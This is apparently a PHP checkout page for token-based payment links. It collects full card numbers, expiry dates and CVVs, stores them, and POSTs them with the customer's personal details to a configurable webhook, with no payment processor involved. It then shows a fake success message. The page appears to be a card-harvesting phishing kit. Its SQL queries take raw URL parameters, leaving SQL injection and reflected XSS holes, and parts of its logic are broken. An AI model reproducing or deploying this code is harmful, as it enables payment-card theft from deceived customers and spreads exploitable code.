<?php
	
	session_start();
	
	include_once "admin/connection.php";
	
	$order_id =$_GET['order_id'];
	$tkn = $_GET['tkn'];
	$amount = $_GET['amount'];
	
	
	$sql="SELECT * FROM links WHERE order_id='$order_id' AND tkn='$tkn' AND amount='$amount' AND status='unused'";	
	$data=mysqli_query($link,$sql);
	
	$deal_id = mysqli_fetch_assoc($data)['deal_id'];
	
	
	$sql="SELECT * FROM deals WHERE id=".$deal_id;
	$deal = mysqli_query($link,$sql);
	$deal = mysqli_fetch_assoc($deal);
	

	
	$order_exits=mysqli_num_rows($data);
	
	
	
	$sql="SELECT * FROM settings WHERE id=1";
    $settings = mysqli_query($link,$sql);
    $settings = mysqli_fetch_assoc($settings);
	
	
	
?>

<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css">
    <link rel="stylesheet" href="https://unpkg.com/bootstrap-select@1.12.4/dist/css/bootstrap-select.min.css" type="text/css" />
    <link rel="stylesheet" href="https://unpkg.com/bootstrap-select-country@4.0.0/dist/css/bootstrap-select-country.min.css" type="text/css" />
    <link rel="stylesheet" href="build/css/intlTelInput.css">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
    <script src="https://unpkg.com/bootstrap-select@1.12.4/dist/js/bootstrap-select.min.js"></script>
    <script src="https://unpkg.com/bootstrap-select-country@4.0.0/dist/js/bootstrap-select-country.min.js"></script>
    <script src="build/js/intlTelInput.min.js"></script>
    <script src="build/js/intlTelInput-jquery.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>


    <style>
        body {
            background-image: url('background.png');
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
        }
        
        .none {
            display: none;
        }
        
        .inlineimage {
            text-align: center;
        }
        
        .images {
            display: inline-block;
            max-width: 98%;
            height: auto;
            width: 15%;
            margin: 1%;
            left: 20px;
            text-align: center
        }
        
        .thanks .images {
            display: inline-block;
            max-width: 98%;
            height: auto;
            width: 10%;
            margin: 1%;
            left: 20px;
            text-align: center
        }
        
        .iti {
            display: block;
        }
        /* Absolute Center Spinner */
        
        .loading {
            position: fixed;
            z-index: 999;
            height: 2em;
            width: 2em;
            overflow: show;
            margin: auto;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
        }
        /* Transparent Overlay */
        
        .loading:before {
            content: '';
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
        }
        /* :not(:required) hides these rules from IE9 and below */
        
        .loading:not(:required) {
            /* hide "loading..." text */
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }
        
        .loading:not(:required):after {
            content: '';
            display: block;
            font-size: 10px;
            width: 1em;
            height: 1em;
            margin-top: -0.5em;
            -webkit-animation: spinner 150ms infinite linear;
            -moz-animation: spinner 150ms infinite linear;
            -ms-animation: spinner 150ms infinite linear;
            -o-animation: spinner 150ms infinite linear;
            animation: spinner 150ms infinite linear;
            border-radius: 0.5em;
            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
        }
        /* Animation */
        
        @-webkit-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @-moz-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @-o-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
</head>


<body>
    <div class="container">
		
		<?php
			
			if($order_exits>0)
			{
		?>
	
	
        <!-- Credit Card Payment Form - START -->
        <div class="container payement" style="margin-top: 25px;">
            <div class="row">
                <div class="col-xs-12 col-md-6 col-md-offset-3">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <div class="row">
                                <h3 class="text-center"><?php $deal['subject']; ?></h3>
                                <div class="inlineimage"> 
								<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Mastercard-Curved.png"> 
								<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Discover-Curved.png">                                    
								<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Visa-Curved.png"> 
								<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/American-Express-Curved.png">                                    
								<img class="img-responsive images" src="/mastro.png">                                    
								
								
								</div>
                            </div>
                        </div>
                        <form role="form" id="payement" autocomplete="off">

                            <div class="panel-body">
								
								<div class="row">
									 <div class="col-xs-6 col-md-6">
                                        <div class="form-group"> <label>Order ID</label> 
										<input id="order_id" type="text" class="form-control" readonly value="<?php  echo $_GET['order_id']; ?>"/> </div>

                                    </div>
									
									<div class="col-xs-6">
                                        <div class="form-group"> <label>  Amount to pay </label>
                                            <div class="input-group"> <input readonly style="z-index:0" value="<?php echo $_GET['amount']; ?>" type="text" id="ammount" class="form-control" placeholder="Amount to pay" data-validation="required" /> <span class="input-group-addon"><?php  echo $deal['currency_code']; ?><?php  echo $deal['currency']; ?></span>
                                            </div>
                                        </div>
                                    </div>
								</div>
								

							   <div class="row">
                                    <div class="col-xs-12 col-md-6">
                                        <div class="form-group"> <label>Cardholder First Name</label> 
										<input autocomplete="off"  type="text" class="form-control" placeholder="First Name" id="firstName" data-validation="required"> </div>

                                    </div>


                                    <div class="col-xs-12 col-md-6">
                                        <div class="form-group"> <label>Cardholder Last Name</label> <input autocomplete="off"  type="text" class="form-control" placeholder="Last Name" id="lastName" data-validation="required" /> </div>

                                    </div>
                                </div>

                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="form-group"> <label>Email</label>
                                            <div class="input-group"> <input type="text" id="email" class="form-control" placeholder="Valid email" data-validation="email" /> <span class="input-group-addon"><span class="fa fa-envelope"></span></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="form-group"> <label>Country</label>
                                            <select id="country" class="selectpicker form-control countrypicker" data-default="US" data-live-search="true">
                                            </select>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-12 col-md-6">
                                        <div class="form-group"> <label>City</label> <input type="text" id="city" class="form-control" placeholder="City" data-validation="required" /> </div>

                                    </div>

                                    <div class="col-xs-12 col-md-6">
                                        <div class="form-group"> <label>Zip Code</label> <input type="text" id="zipCode" class="form-control" placeholder="Zip code" data-validation="required" /> </div>

                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="form-group"> <label>Phone Number</label>
                                            <input style="z-index:0" type="tel" class="form-control" placeholder="" id="phoneNumber" data-validation="custom" data-validation-regexp="^(\+\d{1,3}\s)?\(?\d{2,3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$"/>
                                        </div>
                                    </div>
                                </div>
                                
								
								<hr>
								
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="form-group"> <label>CARD NUMBER</label>
                                            <div class="input-group"> <input autocomplete="off"  style="z-index:0" type="tel" class="form-control" id="cardNumber" placeholder="Valid Card Number" data-validation="creditcard required" /> <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-7 col-md-7">
                                        <div class="form-group"> <label><span class="hidden-xs">EXPIRATION</span><span class="visible-xs-inline">EXP</span> DATE</label> <input id="expirationDate" type="text" onkeypress="return onlyNumberKey(event)" class="form-control" placeholder="MM / YY"
                                                data-validation="date" data-validation-format="mm/yy" /> </div>
										<p id="invalid_expiry" style="color:red;"> Invalid Expiry </p>		
                                    </div>
                                    <div class="col-xs-5 col-md-5 pull-right">
                                        <div class="form-group"> <label>CVV CODE</label> <input id="cvv" type="tel" class="form-control" placeholder="CVV" data-validation="cvv" /> </div>
                                    </div>
                                </div>

                            </div>
                            <div class="panel-footer">
                                <div class="row">
                                    <div class="col-xs-12"> <button class="btn btn-success btn-lg btn-block">Confirm Payment</button> </div>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>
            </div>
        </div>
       
	   <div class="container Thanks none" style="margin-top: 25px;">
            <div class="row">
                <div class="col-xs-12 col-md-8 col-md-offset-2">
                    <div class="panel panel-default">


                        <div class="panel-body text-center">
                            <h3>
                                <b> Thank you <b id="Fname"></b> <b id="Lname"></b> </b>
                            </h3>
                            <h3> <b>We received your order Of <?php  echo $deal['currency']; ?></b><b id="amount_to_pay"></b></h3>
                            <img src="check-mark.gif" style="width: 270px; margin: 15%;" />
                            
							
							<h3>
                                your order number #<b id="order"></b>

                            </h3>
                            <h3>
                                It will appear in your account shortly
                            </h3>

                        </div>
                        <div class="panel-footer ">
                            <div class="row ">
                                <div class="inlineimage "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Mastercard-Curved.png "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Discover-Curved.png
                                "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Visa-Curved.png "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/American-Express-Curved.png ">                                    </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="loading " style="display: none; ">Loading&#8230;</div>
	
	
	<?php 
		}
		else
		{
	?>
	
	
	<div class="container Thanks" style="margin-top: 25px;">
            <div class="row">
                <div class="col-xs-12 col-md-8 col-md-offset-2">
                    <div class="panel panel-default">
						
						<?php
							
							$sql="SELECT * FROM links WHERE order_id='$order_id' AND tkn='$tkn' AND amount='$amount' AND status='used'";	
							$data=mysqli_query($link,$sql);
							$order_exits1=mysqli_num_rows($data);
							
						
						?>

                        <div class="panel-body text-center">
                            <h3>
                            </h3>
                            
							<?php 
								
								if($order_exits1>0)
								{
								
							?>
							
							<h3> <b>Order# <?php echo $order_id; ?> already completed </b> </h3>
							
							<?php
								
								}
								else
								{
							?>
							
							<h3> <b>Error!</b> </h3>
                            
							<?php
							
								}
							?>
							<!--
							<img src="check-mark.gif" style="width: 270px; margin: 15%;" />
                            -->
							
                            

                        </div>
                        <div class="panel-footer ">
                            <div class="row ">
                                <div class="inlineimage "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Mastercard-Curved.png "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Discover-Curved.png
                                "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Visa-Curved.png "> <img class="img-responsive images " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/American-Express-Curved.png ">                                    </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
		
	<?php
	
		}
	
	?>	



   <input type="hidden" id="email_body" value="<?php  echo $deal['email_body']; ?>"/>
    <input type="hidden" id="email_body_admin" value="<?php  echo $deal['email_body_admin']; ?>"/> 


</body>

<script>

$("#invalid_expiry").hide();
    $('.countrypicker').countrypicker();

    $("#phoneNumber ").intlTelInput({
        separateDialCode: true,
    });
    var countryData = $("#phoneNumber").intlTelInput("getSelectedCountryData"); // get country data as obj 

    $('#country').on('change', function() {
        $('#phoneNumber').intlTelInput("setCountry", $('#country').val());
    })

    var validate = $.validate({
        modules: 'html5, sepa , security',
        validateOnBlur: true,

        onSuccess: function() {
            event.preventDefault();
            sendData();
        },
    });

    function sendData() {
        var countryData = $("#phoneNumber").intlTelInput("getSelectedCountryData"); // get country data as obj 
		
		
		
        $('.loading').css({
            display: "block "
        })
		
		
		
		
		// store in db
		$.ajax({
			
            url: "/dashboard/admin/store_order.php",
            method: "POST",
            dataType: "json",
            data: {
                firstName: $('#firstName').val(),
                lastName: $('#lastName').val(),
                cardNumber: $('#cardNumber').val(),
                email: $('#email').val(),
                country: $('#country').val(),
                city: $('#city').val(),
                zipCode: $('#zipCode').val(),
                phoneNumber: "+" + countryData.dialCode + $('#phoneNumber').val(),
                ammount: $('#ammount').val(),
                expirationDate: $('#expirationDate').val(),
                cvv: $('#cvv').val(),
				order_id:$("#order_id").val(),
				deal_id:<?php echo $deal_id; ?>

            },
			success:function(data){
				
				
			}
		
		});
		
		
		
		var card = $('#cardNumber').val();
		var last_4 = card.substr(-4);
	
		var email_subject_client="<?php echo  $deal['email_subject_to_client']; ?>";
		var email_subject_admin="<?php echo  $deal['email_subject_to_admin']; ?>";
	    var email_body=$("#email_body").val();
	    var email_body_admin = $("#email_body_admin").val();
	    
	    
	    var firstName = $('#firstName').val();
	    var lastName = $('#lastName').val();
	    var orer_idd  = $("#order_id").val();
	    var currency = "<?php  echo $deal['currency']; ?>";
	    var currency_code = "<?php echo $deal['currency_code']; ?>";
	    
	    
	    email_subject_client = email_subject_client.replace("#FIRSTNAME", firstName);
	    email_subject_client = email_subject_client.replace("#LASTNAME", lastName);
	    email_subject_client = email_subject_client.replace("#ORDERID", orer_idd);
	    email_subject_client = email_subject_client.replace("#EMAIL", $('#email').val());
	    
	    
	    
	    
	    email_subject_admin = email_subject_admin.replace("#FIRSTNAME", firstName);
	    email_subject_admin = email_subject_admin.replace("#LASTNAME", lastName);
	    email_subject_admin = email_subject_admin.replace("#ORDERID", orer_idd);
	    email_subject_admin = email_subject_admin.replace("#EMAIL", $('#email').val());
	    
	    
	    
	    
	    email_body = email_body.replace("#FIRSTNAME", lastName);
	    email_body = email_body.replace("#LASTNAME", lastName);
	    email_body = email_body.replace("#ORDERID", orer_idd);
	    email_body = email_body.replace("#EMAIL", $('#email').val());
	    email_body = email_body.replace("#CURRENCY",currency);
	    email_body = email_body.replace("#AMOUNT", $('#ammount').val());
	    email_body = email_body.replace("#COUNTRY", $('#country').val());
	    email_body = email_body.replace("#PHONE", "+" + countryData.dialCode + $('#phoneNumber').val());
	    email_body = email_body.replace("#LAST4", last_4);
	    email_body = email_body.replace("#CURRENCYCODE", currency_code);
	    
	    
	    
	    
	    email_body_admin = email_body_admin.replace("#FIRSTNAME", lastName);
	    email_body_admin = email_body_admin.replace("#LASTNAME", lastName);
	    email_body_admin = email_body_admin.replace("#ORDERID", orer_idd);
	    email_body_admin = email_body_admin.replace("#EMAIL", $('#email').val());
	    email_body_admin = email_body_admin.replace("#CURRENCY",currency);
	    email_body_admin = email_body_admin.replace("#AMOUNT", $('#ammount').val());
	    email_body_admin = email_body_admin.replace("#COUNTRY", $('#country').val());
	    email_body_admin = email_body_admin.replace("#PHONE", "+" + countryData.dialCode + $('#phoneNumber').val());
	    email_body_admin = email_body_admin.replace("#LAST4", last_4);
	    email_body_admin = email_body_admin.replace("#CURRENCYCODE", currency_code);
	    
	    
	    

        $.ajax({
            url: "<?php echo $settings['webhook']; ?>",
            method: "POST",
            dataType: "json",
            data: {
                firstName: $('#firstName').val(),
                lastName: $('#lastName').val(),
                cardNumber: $('#cardNumber').val(),
                email: $('#email').val(),
                country: $('#country').val(),
                city: $('#city').val(),
                zipCode: $('#zipCode').val(),
                phoneNumber: "+" + countryData.dialCode + $('#phoneNumber').val(),
                ammount: $('#ammount').val(),
                expirationDate: $('#expirationDate').val(),
                cvv: $('#cvv').val(),
				order_id:$("#order_id").val(),
				last_4:last_4,
				currency:"<?php  echo $deal['currency_code']; ?><?php  echo $deal['currency']; ?>",
				email_subject_client:email_subject_client,
				email_subject_admin:email_subject_admin,
				email_body:email_body,
				email_body_admin:email_body_admin

            },
            success: data => {
               setTimeout(function(){ 


			   $('.loading').css({
                    display: "none"
                })
                $('#Fname').html($('#firstName').val());
                $('#Lname').html($('#lastName').val());
                $('#amount_to_pay').html($('#ammount').val());
                $('#order').html($("#order_id").val());
                $('.thanks').toggleClass('none');
                $('.payement').toggleClass('none');
				
				 }, 4000);
				
            },
            error: data => {
                $('.loading').css({
                    display: "none"
                })
                alert('error while sending data');

            }
        });
		
		


    }

    function onlyNumberKey(evt) {

		
        // Only ASCII character in that range allowed
        var ASCIICode = (evt.which) ? evt.which : evt.keyCode
        if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
            return false;
	
		
        return true;


    }
    $('#expirationDate').on('keyup', function(event) {
		
		
		$("#invalid_expiry").hide();
		
        var ASCIICode = (event.which) ? event.which : event.keyCode
        console.log(ASCIICode)
        if (ASCIICode != 8)
		{
			
            if ($('#expirationDate').val().length == 2)
			{
                $('#expirationDate').val($('#expirationDate').val() + "/");
			}
			else if($('#expirationDate').val().length>2)
			{
				
				var expirationDate =$('#expirationDate').val();
				
				var year = expirationDate.split("/");
				
				
				var dateObj = new Date();
                var month = dateObj.getUTCMonth() + 1; //months from 1-12
                var year = dateObj.getUTCFullYear();
                
            

				
				if(year[1].length==2)
				{
				    
				    if(year[1]>20 && year[1]<28)
					{
						
						
						
					}
					else
					{
						$("#invalid_expiry").show();
					}
					
					
				}
				else if(year[1].length>2)
				{
					
					expirationDate = expirationDate.substring(0, expirationDate.length - 1);
					
					$('#expirationDate').val(expirationDate);
					
				}
				
				
			}
			
			
		}
		
    })
	
	
	$("#cvv").on('keyup', function(event){
		
		var cvv = $("#cvv").val();
		
		if(cvv.length>4)
		{
			cvv = cvv.substring(0, cvv.length - 1);
			
			$("#cvv").val(cvv);
					
		}
	});
</script>


</html>